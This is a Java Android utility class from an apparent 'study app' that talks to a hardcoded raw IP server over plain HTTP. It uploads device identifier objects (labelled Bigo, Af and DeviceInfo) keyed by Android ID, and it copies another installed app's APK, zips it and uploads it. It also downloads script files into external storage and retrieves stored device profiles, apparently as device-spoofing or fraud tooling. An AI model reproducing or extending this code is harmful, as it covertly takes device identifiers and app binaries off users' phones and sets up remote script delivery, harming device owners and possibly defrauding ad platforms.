package com.example.studyapp.task;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import java.io.BufferedOutputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.concurrent.TimeUnit;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;


/**
 * @Time: 2025/6/16 11:11
 * @Creator: 初屿贤
 * @File: TaskUtil
 * @Project: study.App
 * @Description:
 */
public class TaskUtil {

  private static volatile DeviceInfo deviceInfo;
  private static volatile BigoInfo bigoDevice;
  private static volatile AfInfo afDevice;

  private static final String BASE_URL = "http://47.238.96.231:8112";
  private static OkHttpClient okHttpClient = new OkHttpClient.Builder()
      .connectTimeout(30, TimeUnit.SECONDS) // 连接超时
      .writeTimeout(60, TimeUnit.SECONDS)   // 写入超时 (对上传很重要)
      .readTimeout(30, TimeUnit.SECONDS)    // 读取超时
      .build();

  public static void postDeviceInfo(String androidId) {
    Log.i("TaskUtil", "postDeviceInfo called with androidId: " + androidId);

    if (okHttpClient == null) {
      Log.e("TaskUtil", "HttpClient is not initialized");
      throw new IllegalStateException("HttpClient is not initialized");
    }

    if (BASE_URL == null || BASE_URL.isEmpty()) {
      Log.e("TaskUtil", "BASE_URL is not initialized");
      throw new IllegalStateException("BASE_URL is not initialized");
    }

    Log.d("TaskUtil", "Creating payload for the request...");
    Payload payload = new Payload();
    payload.bigoDeviceObject = bigoDevice;
    payload.afDeviceObject = afDevice;
    payload.other = deviceInfo;

    Gson gson = new GsonBuilder().serializeNulls().create();
    String jsonRequestBody = gson.toJson(payload);

    Log.d("TaskUtil", "Request payload: " + jsonRequestBody);

    HttpUrl url = HttpUrl.parse(BASE_URL)
        .newBuilder()
        .addPathSegment("device_info_upload")
        .addQueryParameter("id", androidId)
        .build();

    Log.d("TaskUtil", "Request URL: " + url.toString());

    RequestBody body = RequestBody.create(MediaType.get("application/json; charset=utf-8"), jsonRequestBody);
    Log.d("TaskUtil", "Request body created");

    Request request = new Request.Builder()
        .url(url)
        .post(body)
        .build();

    Log.i("TaskUtil", "Starting network call...");
    try {
      Response response = okHttpClient.newCall(request).execute();
      try (ResponseBody responseBody = response.body()) {
        if (!response.isSuccessful()) {
          Log.e("TaskUtil", "Request failed with status: " + response.code() + ", message: " + response.message());
          return;
        }

        if (responseBody != null) {
          String responseText = responseBody.string();
          Log.i("TaskUtil", "Request succeeded. Response: " + responseText);
        } else {
          Log.e("TaskUtil", "Response body is null");
        }
      } catch (IOException e) {
        Log.e("TaskUtil", "Error while processing response: " + e.getMessage(), e);
      }
    } catch (IOException e) {
      Log.e("TaskUtil", "Network call failed: " + e.getMessage(), e);
    }
  }

  public static String getDeviceInfoSync(String androidId) {
    Log.d("TaskUtil", "getDeviceInfoSync called with androidId: " + androidId);

    validate(); // 检查 BASE_URL 和 okHttpClient 的合法性

    HttpUrl url = HttpUrl.parse(BASE_URL + "/device_info_download")
        .newBuilder()
        .addQueryParameter("androidId", androidId)
        .build();

    Log.d("TaskUtil", "Constructed URL for device info download: " + url.toString());

    Request request = new Request.Builder()
        .url(url)
        .get()
        .build();

    Log.d("TaskUtil", "Built HTTP request for device info download");

    try (Response response = okHttpClient.newCall(request).execute()) {
      // 检查响应是否成功
      if (!response.isSuccessful()) {
        String errorMessage = "Unexpected response: Code=" + response.code() +
            ", Message=" + response.message() +
            ", URL=" + url.toString();
        Log.e("TaskUtil", errorMessage);
        throw new IOException(errorMessage);
      }

      ResponseBody responseBody = response.body();
      if (responseBody != null) {
        String responseString = responseBody.string();
        Log.i("TaskUtil", "Received response: " + responseString);
        return responseString;
      } else {
        String errorMessage = "Response body is null: URL=" + url.toString();
        Log.e("TaskUtil", errorMessage);
        throw new IOException(errorMessage);
      }
    } catch (IOException e) {
      String errorMessage = "Error during HTTP request. URL=" + url.toString() +
          ", Android ID=" + androidId;
      Log.e("TaskUtil", errorMessage, e);
      e.printStackTrace();
      return null; // 或考虑在上层抛出异常
    }
  }

  public static void infoUpload(Context context, String androidId, String packAge) throws IOException {
    Log.i("TaskUtil", "infoUpload called with androidId: " + androidId + ", package: " + packAge);

    if (packAge == null || packAge.isEmpty()) {
      Log.e("TaskUtil", "Package name is null or empty");
      throw new IllegalArgumentException("Package name cannot be null or empty");
    }

    if (context == null) {
      Log.e("TaskUtil", "Context is null");
      throw new IllegalArgumentException("Context cannot be null");
    }

    if (androidId == null || androidId.isEmpty()) {
      Log.w("TaskUtil", "ANDROID_ID is null or empty");
      return;
    }

    PackageInfo packageInfo;
    try {
      Log.d("TaskUtil", "Fetching package info for package: " + packAge);
      packageInfo = context.getPackageManager().getPackageInfo(packAge, 0);
      if (packageInfo == null) {
        Log.e("TaskUtil", "Package info not found for package: " + packAge);
        throw new IllegalStateException("Package info not found: " + packAge);
      }
    } catch (PackageManager.NameNotFoundException e) {
      Log.e("TaskUtil", "Package not found: " + packAge, e);
      throw new RuntimeException("Package not found: " + packAge, e);
    }

    String apkSourceDir = packageInfo.applicationInfo.sourceDir;
    Log.d("TaskUtil", "APK source directory: " + apkSourceDir);

    File externalDir = context.getExternalFilesDir(null);
    if (externalDir == null) {
      Log.e("TaskUtil", "External storage directory is unavailable");
      throw new IOException("External storage directory is unavailable");
    }

    String outputZipPath = new File(externalDir, androidId + "_" + packAge + ".zip").getAbsolutePath();
    Log.d("TaskUtil", "Output ZIP path: " + outputZipPath);

    File zipFile = new File(outputZipPath);
    if (zipFile.exists() && !deleteFileSafely(zipFile)) {
      Log.w("TaskUtil", "Failed to delete old zip file: " + outputZipPath);
      return;
    }

    File sourceApk = new File(apkSourceDir);
    File copiedApk = new File(context.getCacheDir(), packAge + "_temp.apk");
    if (copiedApk.exists() && !deleteFileSafely(copiedApk)) {
      Log.w("TaskUtil", "Failed to delete old temp APK file: " + copiedApk.getAbsolutePath());
      return;
    }

    copyFile(sourceApk, copiedApk);

    // 压缩APK文件
    compressToZip(copiedApk, zipFile, apkSourceDir);

    // 上传压缩文件
    if (!zipFile.exists()) {
      Log.w("TaskUtil", "Upload file does not exist: " + outputZipPath);
      return;
    }

    uploadFile(zipFile);

    // 清理临时文件
    deleteFileSafely(copiedApk);
    deleteFileSafely(zipFile);
  }

  private static boolean deleteFileSafely(File file) {
    if (file.exists()) {
      return file.delete();
    }
    return true;
  }

  private static final int BUFFER_SIZE = 1024 * 4;

  private static void copyFile(File src, File dst) throws IOException {
    Log.d("TaskUtil", "Copying APK file to temp location...");
    try (FileInputStream inputStream = new FileInputStream(src);
        FileOutputStream outputStream = new FileOutputStream(dst)) {
      byte[] buffer = new byte[BUFFER_SIZE];
      int length;
      while ((length = inputStream.read(buffer)) > 0) {
        outputStream.write(buffer, 0, length);
      }
      Log.i("TaskUtil", "APK file copied to temp location: " + dst.getAbsolutePath());
    } catch (IOException e) {
      Log.e("TaskUtil", "Error while copying APK file", e);
      throw e;
    }
  }

  private static void compressToZip(File src, File dst, String apkSourceDir) throws IOException {
    Log.d("TaskUtil", "Starting to compress the APK file...");
    try (FileInputStream fis = new FileInputStream(src);
        FileOutputStream fos = new FileOutputStream(dst);
        ZipOutputStream zipOut = new ZipOutputStream(fos)) {

      String entryName = new File(apkSourceDir).getName();
      zipOut.putNextEntry(new ZipEntry(entryName));
      byte[] buffer = new byte[BUFFER_SIZE];
      int bytesRead;
      while ((bytesRead = fis.read(buffer)) >= 0) {
        zipOut.write(buffer, 0, bytesRead);
      }
      zipOut.closeEntry();
      Log.i("TaskUtil", "APK file successfully compressed to: " + dst.getAbsolutePath());
    } catch (IOException e) {
      Log.e("TaskUtil", "Error during APK file compression", e);
      throw e;
    }
  }

  public static void uploadFile(File fileToUpload) throws IOException {
    Log.d("TaskUtil", "Preparing to upload file...");
    RequestBody fileBody = RequestBody.create(MediaType.get("application/zip"), fileToUpload);
    MultipartBody requestBody = new MultipartBody.Builder()
        .setType(MultipartBody.FORM)
        .addFormDataPart("file", fileToUpload.getName(), fileBody)
        .build();

    Request request = new Request.Builder()
        .url(BASE_URL + "/tar_info_upload")
        .post(requestBody)
        .build();

    Log.i("TaskUtil", "Starting file upload to: " + BASE_URL + "/tar_info_upload");

    try (Response response = okHttpClient.newCall(request).execute()) {
      ResponseBody body = response.body();
      if (response.isSuccessful() && body != null) {
        String responseBody = body.string();
        Log.i("TaskUtil", "File upload successful. Response: " + responseBody);
      } else {
        Log.w("TaskUtil", "File upload failed. Response: " + (response.message() != null ? response.message() : "Unknown"));
        if (body != null) {
          body.close();
        }
      }
    } catch (IOException e) {
      Log.e("TaskUtil", "File upload failed", e);
      throw e;
    }
  }

  private static void validate() {
    if (okHttpClient == null) {
      throw new IllegalStateException("HttpClient is not initialized");
    }
    if (BASE_URL == null || BASE_URL.isEmpty()) {
      throw new IllegalStateException("BASE_URL is not initialized");
    }
  }

  private static void infoDownload(String androidId) {
    // 下载压缩包
    HttpUrl url = HttpUrl.parse(BASE_URL + "/tar_info_download")
        .newBuilder()
        .addQueryParameter("file_name", "test")
        .build();

    Request request = new Request.Builder()
        .url(url)
        .get()
        .build();

    okHttpClient.newCall(request).enqueue(new Callback() {
      @Override
      public void onFailure(@NotNull Call call, @NotNull IOException e) {
        e.printStackTrace();
      }

      @Override
      public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException {
        if (response.isSuccessful()) {
          byte[] fileBytes = response.body().bytes();
          String savePath = "/storage/emulated/0/Download/test.zip";

          File file = new File(savePath);
          file.getParentFile().mkdirs();

          try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(fileBytes);
            System.out.println("File saved to " + savePath);
          } catch (IOException e) {
            e.printStackTrace();
          }
        } else {
          System.out.println("Download failed: " + response.message());
        }
      }
    });
  }

  public static File downloadCodeFile(String fileName) {
    String baseUrl = BASE_URL + "/download_code_file";
    String fullUrl = baseUrl + "?file_name=" + fileName;

    Request request = new Request.Builder()
        .url(fullUrl)
        .get()
        .build();

    try (Response response = okHttpClient.newCall(request).execute()) {
      if (response.isSuccessful() && response.body() != null) {
        File scriptDir = new File(Environment.getExternalStorageDirectory(), "script");
        if (!scriptDir.exists()) {
          scriptDir.mkdirs(); // 创建 script 目录
        }

        File saveFile = new File(scriptDir, fileName);

        try (InputStream is = response.body().byteStream();
            OutputStream os = new BufferedOutputStream(new FileOutputStream(saveFile))) {

          byte[] buffer = new byte[8192];
          int bytesRead;
          while ((bytesRead = is.read(buffer)) != -1) {
            os.write(buffer, 0, bytesRead);
          }

          Log.i("TaskUtil", "File saved to: " + saveFile.getAbsolutePath());
        }
        return saveFile;
      } else {
        Log.w("TaskUtil", "Download failed: HTTP code " + response.code());
        if (response.body() != null) {
          Log.e("TaskUtil", "Response body: " + response.body().string());
        }
        return null;
      }
    } catch (Exception e) {
      Log.e("TaskUtil", "Error downloading file", e);
      return null;
    }
  }

  public static String execQueryTask(String androidId) {
    return getDeviceInfoSync(androidId);
  }

  public static void execSaveTask(Context context, String androidId) {
    if (context == null) {
      throw new IllegalArgumentException("Context or Package name cannot be null or empty");
    }

    if (androidId == null || androidId.isEmpty()) {
      System.err.println("ANDROID_ID is null or empty");
      return;
    }

    try {
      postDeviceInfo(androidId);
    } catch (Exception e) {
      System.err.println("Error in execReloginTask: " + e.getMessage());
      e.printStackTrace();
    }
  }

  public static void setHttpClient(OkHttpClient client) {
    okHttpClient = client;
  }

  public static void setDeviceInfo(DeviceInfo info) {
    deviceInfo = info;
  }

  public static void setBigoDevice(BigoInfo info) {
    bigoDevice = info;
  }

  public static void setAfDevice(AfInfo info) {
    afDevice = info;
  }
}

class Payload {

  BigoInfo bigoDeviceObject;
  AfInfo afDeviceObject;
  DeviceInfo other;
}

